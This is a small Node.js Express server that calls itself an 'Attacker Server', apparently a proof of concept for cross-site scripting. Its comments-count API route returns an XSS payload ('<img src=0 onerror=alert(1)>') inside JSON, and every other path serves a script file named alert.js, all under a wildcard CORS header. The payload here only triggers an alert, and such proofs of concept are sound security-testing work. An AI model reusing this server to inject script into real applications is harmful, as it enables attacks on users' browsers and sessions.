const express = require('express');
const path = require('path');
const app = express();
const port = 9999;

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Content-Type', 'application/javascript');
  next();
});

app.get('/api/open/project/:appId/comments/count', (req, res) => {
  const data = {
    "XXX-YYY-ZZZ": "<img src=0 onerror=alert(1)>"
  };
  res.json({ data: data });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'alert.js'));
});


app.listen(port, () => {
  console.log(`Attacker Server listening on http://localhost:${port}`);
});
